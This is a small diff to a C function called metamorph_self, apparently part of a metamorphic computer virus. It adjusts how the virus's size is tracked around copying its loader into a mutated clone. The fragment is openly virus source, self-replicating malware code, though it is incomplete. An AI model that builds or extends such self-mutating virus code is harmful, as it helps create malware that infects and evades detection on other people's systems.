@@ -100,6 +100,8 @@ bool		metamorph_self(struct safe_ptr clone, size_t *virus_size, \
 	size_t	loader_entry_off = loader_off;
 	void	*clone_loader    = safe(clone, loader_entry_off, loader_size);
 
+	*virus_size -= loader_size;
+
 	// get clone virus pointer
 	size_t	loader_virus_dist = (size_t)virus - (size_t)loader_entry;
 	size_t	virus_entry_off   = loader_off + loader_virus_dist;
@@ -123,5 +125,6 @@ bool		metamorph_self(struct safe_ptr clone, size_t *virus_size, \
 	|| !true)
 		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
 
+	*virus_size += loader_size;
 	return true;
 }
